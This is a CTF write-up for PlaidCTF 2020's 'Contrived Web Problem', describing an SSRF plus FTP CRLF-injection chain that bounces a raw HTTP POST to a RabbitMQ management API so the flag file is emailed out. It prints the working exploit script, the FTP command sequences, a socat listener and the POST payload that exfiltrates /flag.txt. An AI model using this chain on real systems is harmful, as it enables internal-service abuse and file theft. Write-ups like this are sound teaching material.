# [Web] Contrived Web Problem - 350
*Warning*: This writeup is a creation of my lonely quarantined mind. It may be longer than required. If you're busy, jump to [the Attack Plan](#The-Attack-Plan).

This was an exciting challenge in PlaidCTF 2020. Let's dive right in!

The source code for a web app is given:

![](https://i.imgur.com/utcVnKb.png)

As you can see, there are 6(!) services.
Before going through all of them, I quickly grepped for `flag`:
![](https://i.imgur.com/sKPPDeM.png)
Aha! Now we know where the flag is. It's in the `/flag.txt` file in the services which use the `services.dockerfile` Dockerfile.

A quick look into `docker-compose.yml` reveals that only `api`, `server` and `email` services use this dockerfile.

So, it's clear that only these services can read the flag. This will come in handy.


## Exploration
Let's get a broad overview of what the services do:
- The **api** service has the following endpoints:
    - `/register` - allows the user to create an account
    - `/login` - allows the user to login
    - `/password-reset` - sends the password and email it to the user
    - `/self` - returns info. about logged in user
    - `/profile` - Allows user to upload a profile image. The image is stored on the `ftp` server.
    - `/post` - create/get posts
    - `/image` - return image from a given url
    
    Images are checked for PNG headers while uploading as well as retrieving.
    The `/image` endpoint indicates a possible SSRF attack. We'll look at it again later.
- Then there's the `email` service:
    - It's quite simple, listen for message on the rabbitmq queue and send email. But there's one red herring:
    ![](https://i.imgur.com/MR3MrIp.png)
    
    There's no check to validate message content. And it's directly passed to the `sendMail` function. This could allow us to mess with it if we could somehow send custom messages to the queue.


`ftp`, `rabbit` and `postgres` are just running stock programs. And I couldn't find anything unusual in the `server` service.

## Finding a way to read the flag
Earlier, we noticed that only `api`, `email` and `server` services have `/flag.txt`. So let's look for ways to read it.

- `api` service

As we noticed earlier, there's a possible SSRF. But only `http:`, `https:` and `ftp:` protocols are allowed.
Furthermore, the fetched content is checked for PNG headers. I couldn't find any way to read `/flag.txt` from this service alone.

- `server` is just a simple express server to serve files and proxy the api. There's no way to read files.

- `email` service

Now, this one's interesting. Let's assume that we can control the parameters sent to `sendMail` function. Is there any way to read files?
Let's take a look at Nodemailer docs and find out what all options are available. 
https://nodemailer.com/message/attachments/
We can just pass the file path to send it as an attachment. Interesting! This could be a way to read `/flag.txt`

**If we could somehow send arbitrary messages to the `email` queue, we can control what goes into the `sendMail` and thus, send `flag.txt` as an attachment.**

I decided to go with this approach and started finding ways to send custom messages to the `rabbitmq` queue.

Maybe we can use the SSRF in `api` service.

We can use the AMQP protocol as it's a binary protocol, chaining it with SSRF will be hard. So, I tried to find a way to do it via HTTP.

A quick look at `rabbitmq` documentation reveals that if the management plugin is turned on, we can publish messages via a simple HTTP POST.

![](https://i.imgur.com/aCHT8mI.png)

And guess what, the `rabbit` services has management enabled. This could be the way!

## Doing it backwards
Now that we have a theory to get the flag, let's find a way to make it work.

The first thing that comes to mind is to utilize the SSRF to send the request. But, there's an issue:

![](https://i.imgur.com/G7q0XBD.png)

We can only send GET requests :slightly_frowning_face: 

I tried to find a `GET` endpoint to publish messages to the queue, but nothing!

Then I tried request splitting, but that didn't work either because they're using `node:12`

After wasting a lot of time here, I moved on.

Looking through the `api` service, there's one more protocol supported, `ftp:`
![](https://i.imgur.com/jSDPLEC.png)

I had overlooked this part. Here's a crazy idea: what if we could do something similar to request splitting. FTP is also a text-based protocol after all.

After going through `node-ftp`'s source, I realized that there are no checks on username/password. We should be able to send something like `user\r\nRANDOM_FTP_COMMAND` as username.

And guess what, it worked! :fist: 

We can run arbitrary FTP commands, comrades!

Now, we'll have to find a way to send a POST request to `rabbit` using FTP. Sounds crazy, right?!

Knowing nothing about the FTP, I turned to my best friend, Google.

Here's an interesting fact about FTP: there's a separate connection for data transfers. I learned that there are two ways in which this connection is created:
- `Active`: The client opens a port and informs the server to make a connection to it. The `PORT` ftp command is used for this. As you might have noticed, this gets problematic due to NAT. That's why they created the passive mode.
- `Passive`: The client requests the server (by sending `PASV`) to open a port to establish the data connection.

I was curious to know how the server knows which port to connect to or vice versa. So, I dug deeper.

Here's an example to understand this:
To retrieve a file named `test`:
```
# First, authenticate
> USER user
<
> PASS pass
<
Now, the client will open a port, say :8001 and inform the server about it. This is Active mode.
> PORT 127,0,0,1,0,8001
<
> RETR test
# The ftp server will now send the file to 127.0.0.1:8001
```
Isn't that fascinating?! We can make the ftp server send stuff to an arbitrary server!

This could be a way to send a POST request to rabbit management and thus get the flag.

I quickly thought of an attack plan.

## The Attack Plan
Here's what we are gonna do:
- Execute arbitrary ftp commands by injecting it into the `username` field
- upload a file containing raw POST request to add a message to the `email` queue which'll send an email with `/flag.txt` as an attachment.
- use ftp `PORT` command to send that file to the rabbitmq management server

And hopefully, we'll get the flag.

<details><summary>Some Gotchas</summary>
<p>
- The `api` server sends `RETR filename` right after a connection which could interfere with our commands (it did in my case). To get around it, I add a stray `PORT` command which connects to a closed port.

The script is attached if anyone wants to try. Here's the relevant section:
```javascript
//PORT_LINE = "PORT 13,233,55,1xx,0,80"
PORT_LINE = "PORT 172,32,56,72,0,15672"
//PORT_LINE = "PORT 127,0,0,1,0,8002"
commands = [
    //"DELE zevtnax",
    "PASS test",
    "ABOR",
    "ABOR",
    "ABOR",
    //PORT_LINE,
    "PORT 127,0,0,1,0,8009", // This is the closed port I was talking about earlier
    "LIST",
    PORT_LINE,
    "RETR zevtnax",
]
command_str = commands.map(x=>encodeURIComponent(x)).join("%0d%0a")
const filename = "zevtnax"
const url = "ftp://user%0d%0a" + command_str + ":test@ftp:21/" + filename

//await fetch("http://localhost:8080/api/image?url=" + encodeURI(url));
await fetch("http://contrived.pwni.ng/api/image?url=" + encodeURI(url));
```

</p>
</details>

### Step 1: Upload raw POST payload
I created a simple socat server to listen for data connections:
```bash
ubuntu@ip-172-31-3-141:~/ctf/problem$ cat s.sh 
#!/bin/bash
sleep 0.1
cat payload
ubuntu@ip-172-31-3-141:~/ctf/problem$ sudo socat -v -v tcp-l:80,reuseaddr,fork exec:./s.sh
```
Here's the first payload I sent:
```
POST /api/exchanges/%2F/amq.default/publish HTTP/1.1
Host: 172.32.56.72:15672
Authorization: Basic dGVzdDp0ZXN0
Accept: */*
Content-Type: application/json;charset=UTF-8
Content-Length: 267

{"vhost":"/","name":"amq.default","properties":{"delivery_mode":1,"headers":{}},"routing_key":"email","delivery_mode":"1","payload":"{\"to\":\"zevtnax+ppp@gmail.com\", \"attachments\": [{\"path\": \"/flag.txt\"}]}","headers":{},"props":{},"payload_encoding":"string"}
```
**Mind that the line ending should be CRLF*

Then send the following FTP commands:
```
USER user
PASS test
PORT 1,1,1,1,0,80
APPE zevtnax
```
*Replace 1,1,1,1 with your IP

This created a file named `zevtnax` and stored the POST request in it.
### Step 2:
Simple, send the file to rabbitmq server:
```
USER user
PASS test
PORT 172,32,56,72,0,15672
RETR zevtnax
```

But it didn't work. I spent a lot of time here. 

The problem is that apparently, ftp closes the data connection right after sending the POST request, which prevents rabbitmq management server from receiving the request successfully.

A quick workaround I could think of was to somehow make the data connection stay longer after sending the payload. One way to do this could be to append a lot of garbage after the payload.

So, run:
```bash
ubuntu@ip-172-31-3-141:~/ctf/problem$ for i in {0..1000};do cat payload_bak >> payload;done
```
Then send the payload again.

And Voila! It worked! I got the flag in my email.

Thanks PPP for this awesome chal! Quite a contrived challenge indeed.
